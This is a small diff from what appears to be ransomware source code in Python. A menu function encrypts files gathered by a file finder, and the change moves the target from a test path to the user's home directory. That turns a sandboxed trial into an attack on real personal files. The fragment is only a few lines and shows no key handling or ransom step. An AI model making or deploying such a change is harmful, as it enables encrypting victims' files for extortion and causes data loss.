@@ -72,7 +72,7 @@ def start_encryption(files):
     
 
 def menu():
-    new_files = get_files.find_files(variables.test_path)
+    new_files = get_files.find_files(variables.home)
     aes_keys_and_base64_path = start_encryption(new_files)
 
     if(aes_keys_and_base64_path):
